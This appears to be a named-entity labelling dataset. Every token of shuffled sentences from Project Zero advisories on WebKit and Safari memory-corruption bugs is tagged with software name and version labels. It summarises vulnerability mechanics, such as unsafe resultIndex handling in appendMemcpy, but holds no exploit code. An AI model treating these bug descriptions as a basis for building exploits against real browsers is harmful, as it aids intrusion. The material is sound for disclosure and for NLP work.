is O
possible O
to O
create O
one O
by O
calling O
Array.splice O
on O
an O
array O
with O
all O
undefined O
elements O
. O

It O
should O
be O
difficult O
to O
reach O
this O
state O
without O
a O
long O
execution O
time O
, O
because O
an O
array O
of O
length O
resultIndex O
needs O
to O
be O
allocated O
and O
copied O
before O
resultIndex O
is O
incremented O
, O
however O
if O
both O
arrays O
involved O
in O
the O
concatenation O
are O
of O
type O
ArrayWithUndecided O
JSArray O
: O
:appendMemcpy O
returns O
true O
without O
copying O
, O
and O
resultIndex O
can O
be O
incremented O
with O
a O
low O
execution O
time O
. O

In O
builtins/ArrayPrototype.js O
, O
the O
function O
concatSlowPath O
calls O
a O
native O
method O
@ O
appendMemcpy O
with O
a O
parameter O
resultIndex O
that O
is O
handled O
unsafely O
by O
the O
method O
. O

Apple O
Safari O
- O
Array O
concat O
Memory O
Corruption O

iTunes SN
before SV
12.6 SV
on O
Windows O
is O
affected O
. O

iCloud SN
before SV
6.2 SV
on O
Windows O
is O
affected O
. O

If O
90 O
days O
elapse O
without O
a O
broadly O
available O
patch O
, O
then O
the O
bug O
report O
will O
automatically O
become O
visible O
to O
the O
public O
. O

With O
any O
fix O
, O
please O
give O
credit O
for O
identifying O
the O
vulnerability O
to O
Ivan O
Fratric O
of O
Google O
Project O
Zero O
. O

Please O
note O
: O
This O
bug O
is O
subject O
to O
a O
90 O
day O
disclosure O
deadline O
. O

This O
results O
in O
negative O
memmove O
in O
WebCore O
: O
:HTMLFormElement O
: O
:registerFormElement O
. O

The O
vulnerability O
was O
confirmed O
on O
a O
nightly O
build O
of O
WebKit O
. O

Apple O
WebKit O
- O
Negative-Size O
memmove O
in O
HTMLFormElement O

Tested O
on O
Webkit SN
Nightly SN
10.0.2 SV
( O
12602.3.12.0.1 SV
, O
r210800 SV
) O

Apple SN
WebKit SN
10.0.2 SV
( O
12602.3.12.0.1 SV
, O
r210800 SV
) O
- O
constructJSReadableStreamDefaultReader O
Type O
Confusion O

The O
PoC O
also O
crashes O
Safari O
10.0.2 O
on O
Mac O
. O

The O
vulnerability O
was O
confirmed O
on O
the O
latest O
nightly O
build O
of O
WebKit O
. O

Apple SN
